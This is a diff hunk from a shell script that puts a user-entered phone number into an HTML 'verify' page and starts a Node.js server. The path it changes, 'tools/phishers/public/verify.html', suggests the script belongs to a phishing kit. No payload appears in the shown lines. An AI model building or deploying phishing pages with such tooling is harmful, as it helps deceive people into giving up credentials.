@@ -7,7 +7,7 @@ read -p "Enter the phone number to send the message to: " phoneNumber
 escapedPhoneNumber=$(printf '%s' "$phoneNumber" | sed 's/[&/\]/\\&/g')
 
 # Update the phone number in the HTML file located in the public folder
-sed -i "s/{{PHONE_NUMBER}}/$escapedPhoneNumber/" public/verify.html
+sed -i "s/{{PHONE_NUMBER}}/$escapedPhoneNumber/" tools/phishers/public/verify.html
 
 # Start the Node.js server in the background
 echo "Starting Node.js server..."
